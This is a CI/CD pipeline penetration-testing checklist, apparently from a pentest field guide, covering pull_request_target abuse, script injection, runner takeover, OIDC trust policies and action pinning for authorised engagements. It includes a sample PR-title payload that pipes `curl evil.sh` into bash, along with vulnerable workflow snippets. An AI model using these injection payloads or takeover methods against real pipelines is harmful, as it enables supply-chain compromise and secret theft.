---
tags:
  - hack-notes
  - checklist
  - cicd
  - supply-chain
---

# CI/CD Pipeline Testing Checklist

> Methodology for testing CI/CD pipelines (GitHub Actions, GitLab CI, Jenkins, Azure DevOps, CircleCI, Bitbucket) against the OWASP Top 10 CI/CD Security Risks. Work top to bottom. The recurring discipline: treat every place attacker-controlled input meets a trusted execution context (a runner with secrets, a deploy credential, a signing key) as a candidate for code execution. Commands and tooling live in the linked cheatsheets and in Caminus; this file is the ordered method.

## Table of Contents
- [1. Pre-Engagement and Scoping](#1-pre-engagement-and-scoping)
- [2. Source Control (SCM) Security](#2-source-control-scm-security)
- [3. Pipeline Configuration Abuse (PPE)](#3-pipeline-configuration-abuse-ppe)
- [4. Secrets Exposure](#4-secrets-exposure)
- [5. Self-Hosted Runner Attacks](#5-self-hosted-runner-attacks)
- [6. Dependency and Supply Chain](#6-dependency-and-supply-chain)
- [7. Access to Cloud and Production](#7-access-to-cloud-and-production)
- [8. Third-Party Actions and Plugins](#8-third-party-actions-and-plugins)
- [Recent Techniques (2024-2026)](#recent-techniques-2024-2026)
- [Reporting and Evidence](#reporting-and-evidence)
- [Tools and References](#tools-and-references)
- [Related](#related)

---

## 1. Pre-Engagement and Scoping

CI/CD testing is uniquely high-blast-radius: a single proven Poisoned Pipeline Execution can reach production cloud, signing keys, and the artifact registry that every downstream consumer trusts. Scope tightly before touching anything.

### Authorization and Boundaries
- [ ] **Confirm written scope:** Exact orgs, repos, pipeline definitions, and registries in scope. Get the org/group slug allow-list in writing. A mono-org PAT can scan thousands of repos; agree which ones you may actually run code in.
- [ ] **Map prod-deploy blast radius:** Identify which pipelines can deploy to production, push to a public registry, or mint releases. These are the crown-jewel pipelines. Get explicit sign-off before triggering any job that deploys, tags, or publishes.
- [ ] **Clarify the live-target rule:** Confirm whether you may push branches, open PRs, modify workflow files, or only review them statically. PPE proof often requires a real pipeline run; agree on a sandbox repo or a canary branch up front.
- [ ] **Get a teardown contact:** Self-hosted runner persistence, registered implant runners, and committed test workflows must be removed. Name the person who unwinds them.

### Platform and Architecture Mapping
- [ ] **Identify the SCM platform:** GitHub (cloud vs Enterprise Server), GitLab (SaaS vs self-managed), Bitbucket, Azure Repos, Gitea/Forgejo. Drives the trigger and token model for every later phase.
- [ ] **Identify the CI system:** GitHub Actions, GitLab CI, Jenkins, Azure Pipelines, CircleCI, TeamCity, Argo/Tekton. Note where pipeline definitions live (in-repo YAML vs server-side job config). In-repo definitions are attacker-modifiable via PR; server-side ones are not.
- [ ] **Classify the runners (critical):** Cloud-hosted/ephemeral (GitHub-hosted, GitLab SaaS shared) vs self-hosted/non-ephemeral. Self-hosted, non-ephemeral, reusable runners are the single highest-value target in CI/CD. Note their labels and which repos can target them.
- [ ] **Record the repo access level provided:** Unauthenticated/external (fork-PR contributor), read collaborator, write collaborator, maintainer, org admin. Your access tier defines which PPE class (direct vs indirect) is in play.
- [ ] **Enumerate the trust boundaries:** Public repo (fork PRs from anyone) vs private/internal. Public repos expose `pull_request_target` and Pwn Request surface to the entire internet.

```
CI/CD scoping sheet (fill before testing):
  SCM: ______ (cloud/self-managed)   CI: ______
  Runners: [ ] cloud/ephemeral  [ ] self-hosted/non-ephemeral  labels: ______
  My access: external-PR / read / write / maintainer / admin
  Crown-jewel pipelines (deploy/publish/sign): ______
  Cloud federation: AWS / Azure / GCP via OIDC?  ______
  Live-run allowed? canary branch/sandbox repo: ______
```

---

## 2. Source Control (SCM) Security

Maps to CICD-SEC-1 (Insufficient Flow Control) and CICD-SEC-2 (Inadequate IAM). The SCM is the entry point: if you can land code in a branch the pipeline trusts, you control the pipeline. See [OSINT and Recon](../Cheatsheets/OSINT%20and%20Recon.md) for org/member/repo enumeration before authenticated review.

### Branch Protection and Review Gates
- [ ] **Audit branch protection on default and release branches:** Require-PR, require-review, dismiss-stale-reviews, require-status-checks, require-up-to-date, block-force-push, require-signed-commits. A protected-looking branch with `Allow force pushes` or no required reviewers is unprotected. Pass = direct push to default rejected.
- [ ] **Test required-review bypass:** Check whether admins/owners can merge without review (`Do not allow bypassing` toggle off), whether the rule covers all merge paths, and whether a status check can be self-satisfied. Self-approval and admin-merge defeat the gate.
- [ ] **Probe CODEOWNERS bypass:** Confirm CODEOWNERS is enforced via "Require review from Code Owners". Test whether adding a co-owned path, editing `.github/CODEOWNERS` in the same PR, or pushing to a path not covered by any pattern sidesteps owner review. An unprotected `CODEOWNERS` file is editable in the PR that needs it.
- [ ] **Check ruleset vs legacy protection coverage:** GitHub rulesets and legacy branch protection can disagree. Verify the effective ruleset actually applies to the branch pattern and is not shadowed by a more permissive rule.

### Tokens, Secrets, and Webhooks
- [ ] **Enumerate token scopes:** Default `GITHUB_TOKEN` / CI job token permissions (read vs write `contents`, `packages`, `id-token`, `pull-requests`). A workflow with `permissions: write-all` (or no `permissions:` block on an older default) hands every job a write token. Pass = least-privilege per-job `permissions`.
- [ ] **Inventory repo and org secrets / variables:** List Actions secrets, Dependabot secrets, environment secrets, and CI/CD variables. Flag long-lived cloud keys, registry creds, and PATs stored as secrets (prefer OIDC, Phase 7). Note which secrets are exposed to which environments and branches.
- [ ] **Test GitLab CI variable protection/masking:** Confirm sensitive variables are Protected (exposed only on protected branches/tags) and Masked. An unprotected variable is readable from any feature branch's pipeline; masking is display-only, not an exfil control.
- [ ] **Validate webhook secrets:** Check that inbound webhooks (to CI triggers, ChatOps, deploy hooks) verify an HMAC signature and that the secret is not blank/guessable. An unsigned webhook endpoint lets an attacker forge pipeline triggers.
- [ ] **Hunt secrets in git history and config:** Scan full history, not just HEAD, for keys, tokens, `.npmrc`, `.pypirc`, kubeconfigs, and `.env`. See [OSINT and Recon](../Cheatsheets/OSINT%20and%20Recon.md). Rotated-but-committed creds are frequently still live.

### Fork and Pull-Request Risk Surface
- [ ] **Determine fork-PR workflow behavior:** For public repos, identify which workflows run on `pull_request` from forks and whether they require maintainer approval for first-time contributors (the "Require approval for all outside collaborators" setting). This setting is the primary mitigation for Pwn Requests.
- [ ] **Flag any `pull_request_target` / `workflow_run` triggers:** These run in the base-repo context with secrets and a write token. Enumerate every workflow using them; each is a Phase 3 PPE candidate.
- [ ] **Check fork access to secrets and self-hosted runners:** Confirm fork PRs cannot reach environment secrets or `self-hosted`-labeled runners. A fork PR that can schedule onto a self-hosted runner is a direct path to runner takeover (Phase 5).

---

## 3. Pipeline Configuration Abuse (PPE)

Maps to CICD-SEC-4 (Poisoned Pipeline Execution). PPE is the core CI/CD attack: get attacker-controlled code or input to execute inside the pipeline's privileged context. Deep payloads and platform syntax live in [CICD and Supply Chain](../Cheatsheets/CICD%20and%20Supply%20Chain.md); this is the method. Caminus statically flags PPE sinks across the repo set.

### Direct PPE (D-PPE)
- [ ] **Test write-access pipeline modification:** With write/maintainer access, can you edit the in-repo pipeline file (`.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`) on a branch that triggers a run with secrets? Direct edit of the CI definition is the simplest PPE. Pass = pipeline executes your injected step with access to secrets/runner.
- [ ] **Test feature-branch trigger reach:** Confirm whether pushing a workflow change to a non-default branch runs it with the same secret/token scope as default. Many setups run untrusted feature-branch CI with full privileges.
- [ ] **Abuse on-push triggers in unprotected branches:** A `push`-triggered deploy job that fires on any branch lets a write-access attacker deploy from arbitrary code.

### Indirect PPE (I-PPE)
- [ ] **Find config files the pipeline executes but does not gate:** Even without editing the workflow itself, injecting into files the pipeline runs (`Makefile`, `package.json` scripts, `tox.ini`, `Dockerfile`, `.pre-commit-config.yaml`, test files, `terraform` external data sources) achieves code execution. I-PPE bypasses CODEOWNERS on the workflow file.
- [ ] **Trace build-tool hooks:** `npm` lifecycle scripts (`preinstall`/`postinstall`), `pip`/`setup.py`, Gradle/Maven plugin goals, `make` targets called by CI. Any of these running on attacker-controlled content is I-PPE.

### Script Injection via Expressions
- [ ] **Grep for untrusted input interpolated into `run:` steps:** GitHub Actions expands `${{ ... }}` into the shell script before execution. Attacker-controlled fields injected into a `run:` block yield arbitrary command execution. Treat every one of these as RCE until proven sanitized.

```yaml
# Vulnerable: title is attacker-controlled, expanded into the shell
- run: echo "PR title: ${{ github.event.pull_request.title }}"
# A PR title of: a"; curl evil.sh | bash; echo "
# executes on the runner.
```

- [ ] **Enumerate the dangerous input fields:** `github.event.issue.title`, `.issue.body`, `.pull_request.title`, `.pull_request.body`, `.pull_request.head.ref` (branch name), `.comment.body`, `.review.body`, `.head_commit.message`, `.pages.*.page_name`, and any `inputs.*` from `workflow_dispatch`. Branch name and commit message injection drove the Ultralytics compromise.
- [ ] **Confirm safe vs unsafe handling:** Safe pattern binds input to an `env:` var and references `"$VAR"` inside `run:` (no `${{ }}` in the script body). Flag any direct interpolation as the finding.
- [ ] **Check GitLab/Jenkins equivalents:** GitLab `$CI_*` predefined vars are mostly safe, but `groovy`/shell that interpolates MR titles, branch names, or `description` is injectable. Jenkins Groovy string interpolation of SCM params is a known RCE sink.

### pull_request_target and workflow_run Abuse
- [ ] **Identify the Pwn Request pattern:** A `pull_request_target` (or `workflow_run` chained off `pull_request`) workflow that checks out and executes the PR HEAD runs untrusted fork code with base-repo secrets and a write token. This is the highest-severity PPE class on public repos.

```yaml
# Pwn Request: runs in base context WITH secrets, then runs fork code
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with: { ref: ${{ github.event.pull_request.head.sha }} }  # untrusted
      - run: npm install && npm test   # executes attacker code with secrets
```

- [ ] **Test the checkout-then-execute chain:** If the workflow checks out `head.sha`/`head.ref` and then runs build/test/lint that executes repo code, a fork PR achieves code execution in the privileged context. Pass = your benign PR triggers an OOB callback / writes a marker from the runner.
- [ ] **Probe label-gated `pull_request_target`:** Some repos gate the dangerous job behind a label. Check whether the label can be self-applied, or whether the initial run (before label) still exposes secrets.
- [ ] **Check `workflow_run` artifact/script trust:** A `workflow_run` workflow that downloads and trusts artifacts or PR metadata from the triggering (untrusted) run can be poisoned. Verify artifacts are treated as untrusted.
- [ ] **Audit GitHub Actions cache poisoning:** A low-privileged workflow (feature branch / fork) that writes to the Actions cache can poison entries consumed by a privileged publish workflow. This was the Ultralytics escalation primitive. Verify cache keys are not shared across trust boundaries.

```
⚠️  PPE PROOF IS DESTRUCTIVE BY NATURE. Proving execution means running code on a
    live runner that holds production secrets and deploy credentials. Use a benign
    marker (DNS/HTTP callback, write a timestamped file, echo a canary) ONLY. Never
    read/exfiltrate real secrets, deploy, push tags, or publish to prove impact.
    Get written sign-off before any pull_request_target / publish-pipeline trigger.
```

---

## 4. Secrets Exposure

Maps to CICD-SEC-6 (Insufficient Credential Hygiene). Once you have any execution in the pipeline (Phase 3) or read access to logs, harvest and prove credential exposure. The tj-actions compromise was, at its core, mass secret exfil to public logs.

### Secrets in Logs, Env, and Artifacts
- [ ] **Review workflow run logs for leaked secrets:** Search completed-run logs for tokens, keys, and the literal output of `env`/`printenv`/`set`. GitHub masks registered secrets in logs, but transformed values (base64, JSON-embedded, secret built from parts) bypass masking. Public-repo logs are world-readable.
- [ ] **Test env-dump and debug exposure:** Steps that run `env`, `set -x` with secret args, or `ACTIONS_STEP_DEBUG`/`ACTIONS_RUNNER_DEBUG` can spill masked-but-derived values. Verbose CI debug logging is a common leak.
- [ ] **Inspect build artifacts and caches:** Download published artifacts and caches; grep for `.env`, `.npmrc`, kubeconfig, cloud creds, source maps, and embedded tokens. Artifacts persist and are often downloadable by anyone with read access.
- [ ] **Check secret scope and masking on the platform:** Confirm secrets are scoped to the minimum environment/branch and that "masked" GitLab variables are not also being echoed in a way that defeats masking.

### Secret Exfiltration via PR / Untrusted Run
- [ ] **Demonstrate exfil only as a benign proof:** Where a PPE primitive exists, the secret-exfil impact is "the runner can read secrets X, Y." Prove by writing the NAMES present in env (not values) or by emitting a hash/length, never the cleartext. See [CICD and Supply Chain](../Cheatsheets/CICD%20and%20Supply%20Chain.md) for safe-proof patterns.
- [ ] **Test fork-PR secret reachability:** Confirm whether a fork PR's jobs receive any secrets (they should not for plain `pull_request`). A misrouted environment secret or a `pull_request_target` path exposes them.

### OIDC and Cloud Federation Trust (intro)
- [ ] **Identify OIDC token issuance:** Workflows requesting `permissions: id-token: write` mint a short-lived OIDC JWT to federate into cloud. Note the audience and the `sub` claim format. Deep trust-policy testing is Phase 7.
- [ ] **Prefer-OIDC gap:** Flag any long-lived cloud access key stored as a CI secret where OIDC federation is available. Static keys in CI are a finding even before exploitation.

---

## 5. Self-Hosted Runner Attacks

Maps to CICD-SEC-5 (Insufficient PBAC) and the runner-takeover research that drove the largest 2024-2026 CI/CD bounties. Self-hosted, non-ephemeral runners are reusable trusted execution hosts: compromise one and you compromise every job that lands on it. Caminus enumerates self-hosted runner usage across the org.

### Enumeration
- [ ] **Find self-hosted runner usage:** Grep workflows for `runs-on: self-hosted` (or custom labels) and inspect run logs for runner names/hostnames. Map which repos and which triggers can schedule onto each runner.
- [ ] **Determine ephemerality:** Ephemeral runners are torn down per job (safer); non-ephemeral runners persist state, tools, and prior-job artifacts between runs. Non-ephemeral is the takeover target. Check the registration flags / runner config.
- [ ] **Check who can reach the runner:** Can a fork PR, a feature branch, or a low-priv repo target the self-hosted label? Any untrusted trigger reaching a self-hosted runner is a critical path.

### Takeover and Persistence
- [ ] **Test job-based code execution on the runner:** Via a PPE primitive (Phase 3), run a benign command on the self-hosted runner. Pass = marker written from the runner host, proving arbitrary execution on shared infrastructure.
- [ ] **Assess Runner-on-Runner (RoR) persistence risk:** On a non-ephemeral runner, an attacker can register a second self-hosted runner as an implant or use a keep-alive job to hold the host for days. Document the exposure; do NOT install a persistent implant on a live target. Note the platform's max job duration as the persistence window.
- [ ] **Probe lateral movement to other jobs:** On a shared non-ephemeral runner, check for secrets/tokens left in the work directory, `_work/`, env, the Docker socket, or the runner's own registration token (`.runner`, `.credentials`). Prior jobs' loot enables cross-repo/cross-team movement. See [Linux Privilege Escalation](../Cheatsheets/Linux%20Privilege%20Escalation.md) and [Pivoting and Tunneling](../Cheatsheets/Pivoting%20and%20Tunneling.md).
- [ ] **Check runner host privilege and network position:** Is the runner root/Docker-group, mounted to the host Docker socket, on a flat internal network, or holding cloud instance-profile credentials (IMDS)? A runner with an IMDS-reachable instance role is a cloud pivot. See [AWS Cloud Penetration Test](AWS%20Cloud%20Penetration%20Test.md).

### Label and Scheduling Abuse
- [ ] **Test label hijacking:** If runner selection is by label and an attacker can register a runner (or a malicious workflow can claim a label), jobs can be routed to an attacker-controlled host that harvests the job's secrets. Verify label assignment is locked to trusted runner groups.
- [ ] **Check runner group / repo assignment:** Confirm org-level runners are restricted to specific repos, not "all repositories." An all-repos self-hosted runner shares one trusted host across every project.

---

## 6. Dependency and Supply Chain

Maps to CICD-SEC-3 (Dependency Chain Abuse). The build pulls untrusted code from registries and executes it with pipeline privileges. See [CICD and Supply Chain](../Cheatsheets/CICD%20and%20Supply%20Chain.md) for registry-specific payloads.

### Dependency Confusion and Typosquatting
- [ ] **Test dependency confusion:** Enumerate internal/private package names from lockfiles, `.npmrc`/`.pypirc`/`pom.xml`, and CI logs. Check whether the resolver can be tricked into pulling a same-named public package at a higher version. Pass (lab/authorized) = a benign public package with a callback is resolved over the intended private one.
- [ ] **Check registry scoping and priority:** Confirm scoped registries (`@org:registry=`), `replaces-base`, and explicit index URLs prevent public-registry fallback. A missing scope config is the dependency-confusion root cause.
- [ ] **Hunt typosquat / brandjacking exposure:** Review for misspelled or recently-substituted dependency names and unexpected new maintainers. The Ultralytics class shows trojanized real packages, not just typosquats.

### Malicious Build Scripts and Lockfile Integrity
- [ ] **Audit install-time script execution:** `npm`/`yarn` lifecycle scripts, `pip` `setup.py`/`PEP 517` build backends, Gradle init scripts. Confirm CI uses `--ignore-scripts` where feasible or vets these. Install-time scripts run with full pipeline privileges.
- [ ] **Verify lockfile integrity enforcement:** `npm ci` (not `npm install`), `pip install --require-hashes`, `yarn --frozen-lockfile`, `go.sum` verification, Cargo `--locked`. A build that resolves floating versions at CI time pulls whatever the registry serves that day.
- [ ] **Check for mutable version pins everywhere:** Floating tags/ranges in dependencies AND in base images (`FROM node:latest`) AND in actions (Phase 8). Mutable = re-pointable by an attacker who controls the upstream.

### Artifact Signing and Provenance
- [ ] **Assess artifact signing:** Are release artifacts and container images signed (Sigstore/cosign, GPG)? Is signature verification enforced at deploy/admission time? Unsigned-but-deployed artifacts allow silent substitution.
- [ ] **Check SLSA provenance:** Is build provenance generated (e.g. GitHub Actions provenance attestations / SLSA generator) and verified by consumers? Provenance ties an artifact to the exact source and build; absent verification, it is decorative.
- [ ] **Validate the publish path:** Trace how artifacts reach the registry (which job, which credential, which trigger). A publish step reachable from a low-trust trigger is a supply-chain injection point, as in Ultralytics.

---

## 7. Access to Cloud and Production

Maps to CICD-SEC-7 (Insecure System Configuration) and CICD-SEC-2 (IAM). The pipeline's reason to exist is to deploy, which means it holds the keys to production. Over-broad federation turns any pipeline foothold into cloud compromise.

### OIDC Trust-Policy Scoping
- [ ] **Pull and analyze the cloud trust policy:** For each OIDC-federated role, read the IAM trust policy (AWS), federated credential (Azure), or workload-identity binding (GCP). The `sub`/`subject` condition is the security boundary. See [AWS Cloud Penetration Test](AWS%20Cloud%20Penetration%20Test.md) and [Azure and M365 Entra ID](Azure%20and%20M365%20Entra%20ID.md).
- [ ] **Test for wildcard / missing sub conditions:** A trust policy keyed only on `aud` or with `repo:org/*:*` (or `:*`) lets any branch, any tag, any fork PR, or any repo in the org assume the role. `repo:org/*` includes throwaway and PoC repos any developer can create.

```json
// AWS: dangerously broad. Any ref in any org repo can assume this role.
"Condition": {
  "StringLike": { "token.actions.githubusercontent.com:sub": "repo:acme/*:*" }
}
// Hardened: pin repo + ref or environment
"StringEquals": { "...:sub": "repo:acme/payments:environment:production" }
```

- [ ] **Catch the StringEquals-with-wildcard bug:** `StringEquals` does not expand `*`; a wildcard entry under `StringEquals` matches a literal `*` and silently fails open or closed unexpectedly. Wildcards require `StringLike`. Flag mismatches.
- [ ] **Verify branch/environment binding:** Production roles should bind to a specific branch (`ref:refs/heads/main`) or, better, a GitHub Environment (`environment:production`) gated by required reviewers. Test whether a feature branch or fork can mint a token that satisfies the prod role's `sub`.

### Deploy Keys, Service Connections, and Over-Privilege
- [ ] **Inventory deploy credentials:** SSH deploy keys, cloud access keys, Azure DevOps service connections, kubeconfigs, registry creds. Note read-vs-write and the privilege of each. Over-privileged deploy creds turn a build foothold into infra control.
- [ ] **Test service-connection scope (Azure DevOps):** Confirm service connections are not granted to all pipelines and that the underlying service principal is least-privilege. A broadly-shared connection is reachable from any pipeline that can be poisoned.
- [ ] **Check for standing admin/Owner cloud roles:** Pipeline identities with `*:*`, AdministratorAccess, Owner, or cluster-admin are a critical finding regardless of how well the trigger is gated.

### Environment Protection Bypass
- [ ] **Audit environment protection rules:** GitHub Environments / GitLab protected environments should require reviewers, restrict to protected branches, and add a wait timer for prod. Test whether the gate can be bypassed by targeting the environment from an unprotected branch or by self-approving the deployment.
- [ ] **Check approval-gate integrity:** Can the deployer also approve? Can a re-run or a `workflow_dispatch` skip the gate? A self-approvable production deployment is a flow-control failure (CICD-SEC-1).

---

## 8. Third-Party Actions and Plugins

Maps to CICD-SEC-3 and CICD-SEC-4. Every third-party action/orb/plugin runs inside your pipeline with your secrets. Mutable references mean the code you reviewed is not necessarily the code that runs. Caminus flags unpinned and mutable action references across all workflows.

### Pinning and Mutability
- [ ] **Audit action/orb/plugin pinning:** Every `uses:` should be pinned to a full 40-char commit SHA, not a tag (`@v4`) or branch (`@main`). Mutable tags can be retargeted to malicious commits, which is exactly how tj-actions/changed-files was weaponized across 23,000+ repos.

```yaml
# Mutable: tag can be re-pointed to a malicious commit by upstream compromise
- uses: tj-actions/changed-files@v45
# Pinned: immutable, audited code
- uses: tj-actions/changed-files@a284dc1814e3fd07f2e34267fc8f81227ed29fb8 # v46.0.1
```

- [ ] **Flag tag and branch references as findings:** A tag-pinned third-party action is a standing supply-chain risk even with no known compromise. Pin-to-SHA is the primary mitigation. Also flag `@main`/`@master` (most dangerous).
- [ ] **Check transitive action trust:** A SHA-pinned action can itself call mutable nested actions. Review the action's own `action.yml` for unpinned `uses:` (the reviewdog/action-setup chain enabled the tj-actions compromise).

### Marketplace and Maintainer Risk
- [ ] **Assess marketplace action provenance:** Prefer verified-creator / first-party actions. Note actions from single-maintainer accounts, recently transferred ownership, or those requesting broad token permissions. A compromised maintainer PAT is the usual root cause.
- [ ] **Review action token and secret access:** Does the third-party action receive the `GITHUB_TOKEN`, secrets, or `id-token`? Minimize what each action can see; a logging/changed-files helper does not need secret access.
- [ ] **Pin and vendor critical actions:** For crown-jewel pipelines, consider vendoring (forking + reviewing + SHA-pinning) third-party actions so upstream compromise cannot reach production.
- [ ] **Watch for retroactive tag movement:** Detection control: alert when a previously-seen action tag points to a new SHA. The tj-actions attacker rewrote existing tags to the malicious commit; SHA-pinned consumers were unaffected.

---

## Recent Techniques (2024-2026)

Run Caminus first for static enumeration of PPE sinks, unpinned actions, self-hosted runners, and OIDC usage across the whole org, then hand-verify the leads below.

- [ ] **tj-actions/changed-files compromise (CVE-2025-30066):** Mutable tags were retroactively repointed to a malicious commit that dumped runner-process memory (secrets) into public workflow logs; 23,000+ repos affected. Test for: any tag/branch-pinned third-party action; SHA-pin everything.
- [ ] **reviewdog/action-setup compromise (CVE-2025-30154):** The upstream link in the tj-actions chain; a compromised action that enabled the downstream attack. Test for: transitive unpinned `uses:` inside actions you call.
- [ ] **Ultralytics PyPI compromise (Dec 2024):** Branch-name script injection in a `pull_request_target`-style workflow plus GitHub Actions cache poisoning escalated to PyPI trusted-publishing token theft and trojanized releases (XMRig). Test for: `head.ref`/branch-name interpolation into `run:`, shared cache across trust boundaries, and a publish path reachable from untrusted triggers.
- [ ] **Self-hosted Runner-on-Runner (RoR) takeover:** Khan/Stawinski bug-bounty class: untrusted job reaches a non-ephemeral self-hosted runner, then installs a second runner as a persistent implant (keep-alive holds the host up to the multi-day max). Automated by Gato-X `--keep-alive`. Test for: fork/feature-branch reach to `self-hosted` labels.
- [ ] **OIDC org-wildcard trust policies:** `repo:org/*` and `:*` `sub` conditions, plus the `StringEquals`-vs-`StringLike` wildcard bug, let any org repo (including PoC/throwaway repos) assume production cloud roles. Test for: missing repo+ref/environment binding in IAM trust policies. (AWS STS has since added provider-specific claim validation; legacy roles still vulnerable.)
- [ ] **Script injection via `github.event` fields:** `issue.title`, `pull_request.title/body`, `head.ref`, `comment.body`, commit messages interpolated through `${{ }}` into `run:` blocks yield RCE. Test for: direct expression interpolation vs `env:`-bound `"$VAR"` usage.
- [ ] **CICD-SEC-4 Pwn Requests via `pull_request_target`/`workflow_run`:** Checkout-and-build of untrusted PR HEAD in the privileged base context. Still the highest-yield public-repo class. Test for: `checkout` of `head.sha` followed by code execution.
- [ ] **Megalodon-class mass pipeline poisoning:** Research demonstrating internet-scale discovery and exploitation of GitHub Actions misconfigs. Reinforces that public PPE surface is enumerated continuously; assume any exposed sink is found.
- [ ] **Dependency-confusion + install-script execution:** Still live across npm/PyPI; combine internal-name disclosure from CI logs with public-registry higher-version publish. Test for: missing registry scoping and `install` (vs `ci`) usage.

### Tooling to run
- [ ] **Caminus:** Primary multi-platform CI/CD pipeline scanner for this engagement: enumerates PPE sinks (direct/indirect/script-injection), unpinned actions, self-hosted runner exposure, OIDC trust scoping, and secret hygiene across the org. Start here.
- [ ] **Gato-X (praetorian-inc):** Static analysis + exploitation for GitHub Actions at scale (Pwn Requests, Actions injection, TOCTOU, self-hosted runner takeover, RoR persistence) from a single PAT.
- [ ] **raven (CycodeLabs):** Open-source CI/CD pipeline vulnerability scanner; graphs workflows to surface PPE and misconfig across GitHub Actions.
- [ ] **gato (praetorian-inc):** Original GitHub Actions enumeration/attack tool; PAT-based recon of secrets, runners, and self-hosted exposure.

---

## Reporting and Evidence

### Evidence to Capture per Finding
- [ ] **Capture the vulnerable config verbatim:** The exact workflow/`.gitlab-ci.yml`/`Jenkinsfile` snippet, file path, repo, branch, and the trigger that reaches it. Quote the dangerous line (the `${{ }}` sink, the `pull_request_target`, the tag-pinned `uses:`).
- [ ] **Prove execution with a benign marker, not impact:** A run-log link showing your canary (OOB DNS/HTTP callback, written timestamp file, echoed token NAMES or length) is sufficient proof of code execution in the privileged context. Save the run URL/ID and the log excerpt. Never capture cleartext secrets or deploy.
- [ ] **Record the trust boundary crossed:** Who can trigger it (external fork PR / low-priv write / etc.), and what the resulting context can reach (which secrets, which runner, which cloud role). Impact = boundary crossed times reachable assets.
- [ ] **For OIDC/cloud findings:** Capture the trust policy JSON and the `sub` claim format, and show (in an authorized account) that a non-prod ref satisfies it. Do not assume the prod role.

### Severity Guidance
| Finding | Typical severity | Driver |
|---|---|---|
| Pwn Request: fork PR -> code exec with prod secrets / OIDC | Critical | Pre-auth (anyone) -> production |
| Self-hosted non-ephemeral runner takeover from untrusted trigger | Critical | Persistent foothold + cross-job loot |
| OIDC org-wildcard trust -> prod cloud role | Critical / High | Any repo -> cloud admin |
| Script injection (`${{ github.event.* }}`) into `run:` | High | RCE on runner with secrets |
| Direct PPE (write access edits pipeline) | High | Needs write, but full pipeline control |
| Unpinned third-party action in crown-jewel pipeline | High / Medium | Standing supply-chain risk |
| Secrets in public logs / artifacts | High / Medium | Depends on secret scope and rotation |
| Mutable base-image / tag pin, no signing/provenance | Medium | Substitution risk, not yet exploited |
| Missing branch protection / self-approve merge | Medium | Enables the above, not impact alone |

### Common False Positives to Rule Out
- [ ] **`env`-bound input is NOT script injection:** If untrusted input is assigned to an `env:` var and referenced as `"$VAR"` (no `${{ }}` in the script body), it is the safe pattern. Verify before reporting.
- [ ] **`pull_request` (not `_target`) from a fork has no secrets:** Plain `pull_request` runs in the fork context without secrets or a write token. Only flag if you confirm secret/runner reachability.
- [ ] **GitLab masking is display-only, not a control:** Masked-but-exfiltratable is still a leak; masked-and-not-logged is fine. Distinguish.
- [ ] **SHA-pinned action calling pinned children is safe:** Only flag transitive risk when a nested `uses:` is actually mutable.
- [ ] **AWS STS claim-validation hardening:** Newer roles may have provider-specific conditions that blunt missing-`sub` issues; confirm the legacy policy is actually live before reporting.

---

## Tools and References

| Tool / Reference | Use |
|---|---|
| Caminus | Multi-platform CI/CD scanner: PPE, unpinned actions, runners, OIDC, secrets (primary) |
| Gato-X / gato (praetorian-inc) | GitHub Actions enum + exploitation, self-hosted runner takeover, RoR |
| raven (CycodeLabs) | Open-source CI/CD pipeline vuln scanner (workflow graphing) |
| zizmor / actionlint | Static linting of GitHub Actions for injection and misconfig |
| octoscan / poutine (BoostSecurity) | Workflow static analysis across SCM platforms |
| TruffleHog / Gitleaks | Secret scanning of repos, history, logs, artifacts |
| trufflehog/cosign + slsa-verifier | Artifact signing and SLSA provenance verification |
| OWASP Top 10 CI/CD Security Risks | Authoritative risk taxonomy (CICD-SEC-1..10) |
| MITRE ATT&CK T1677 (Poisoned Pipeline Execution) | Technique reference for PPE |
| CISA / Wiz / Unit 42 advisories (CVE-2025-30066) | tj-actions incident detail and IOCs |
| HackTricks Cloud (Pentesting CI/CD) | Platform-specific abuse techniques |
| Vendor docs: GitHub Actions secure-use, GitLab CI security, AWS OIDC | Hardening baselines |

---

## Related

- Playbooks: [Poisoned CI Pipeline to Cloud Admin](../Playbooks/Poisoned%20CI%20Pipeline%20to%20Cloud%20Admin.md)
- [CICD and Supply Chain](../Cheatsheets/CICD%20and%20Supply%20Chain.md)
- Caminus
- [AWS Cloud Penetration Test](AWS%20Cloud%20Penetration%20Test.md)
- [Azure and M365 Entra ID](Azure%20and%20M365%20Entra%20ID.md)
- [OSINT and Recon](../Cheatsheets/OSINT%20and%20Recon.md)
- [Kubernetes and Container Breakout](../Cheatsheets/Kubernetes%20and%20Container%20Breakout.md)
- [Linux Privilege Escalation](../Cheatsheets/Linux%20Privilege%20Escalation.md)
- [Pivoting and Tunneling](../Cheatsheets/Pivoting%20and%20Tunneling.md)
- [Reverse Shells and File Transfer](../Cheatsheets/Reverse%20Shells%20and%20File%20Transfer.md)

---
*Part of the [Pentest Field Guide](https://github.com/Su1ph3r/hack-notes-field-guide), maintained by [Cairn Security](https://cairnsecurity.com). Independent penetration testing.*
